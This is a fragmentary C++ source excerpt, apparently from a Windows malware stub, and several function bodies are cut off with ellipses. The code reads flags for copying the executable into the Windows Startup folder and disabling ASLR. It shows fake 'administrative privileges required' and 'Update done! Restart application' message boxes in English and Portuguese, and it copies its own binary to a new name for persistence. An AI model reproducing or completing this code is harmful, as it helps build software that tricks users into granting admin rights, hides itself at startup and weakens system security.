...
int DenyAdm(){
    if (phathien.Copy_exe_to_Windows_Startup == 1 && StartUpExist1 == 0){
	//cout << "startup" <<endl;
	return(0);
	}
  	if (phathien.Disable_Windows_ASLR == 1 && AreXP2 == 0 && RegistryExist1 == 0 ){
	//cout << "registry" <<endl;
	return (0);
    }
	else
...
void AskforUserPermissionXP(){
	if (phathien.Message_Warning_En == 1){
	MessageBoxA(NULL,"Administrative privileges required at the first startup!\n\nRight click on application: Run as administrator", phathien.Ten_Cua_So, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
    }	
	if (phathien.Message_Warning_En == 2){
	MessageBoxA(NULL,"Privilegios administrativos requeridos na primeira inicialização!\n\nClick direito do mouse no aplciativo: Executar como admintrator", phathien.Ten_Cua_So, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
	}
	else
	{
...
void itsOk3(){
	if (phathien.Message_Warning_En == 1){
	MessageBoxA(NULL,"Update done!\n\nRestart application please!", phathien.Ten_Cua_So, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
    }	
	if (phathien.Message_Warning_En == 2){
	MessageBoxA(NULL,"Update finalizado!\n\nReinicie o aplicativo por favor.", phathien.Ten_Cua_So, MB_SERVICE_NOTIFICATION | MB_ICONWARNING);	
	ExitProcess(0);	
	}
	else
	{
...
int CopyHide(){
  ...
  fstream f(phathien.StartUp_Original_Name, fstream::in|fstream::binary);
  f << noskipws;
  istream_iterator<unsigned char> begin(f);
  istream_iterator<unsigned char> end;

  fstream f2(phathien.StartUp_Address_NewName, //xp  	 
  fstream::out|fstream::trunc|fstream::binary);
  ostream_iterator<char> begin2(f2);
  copy(begin, end, begin2);

 // if (AreXP2 == 1){
  ifstream ifile (phathien.StartUp_Address_NewName); 
  if (!ifile){
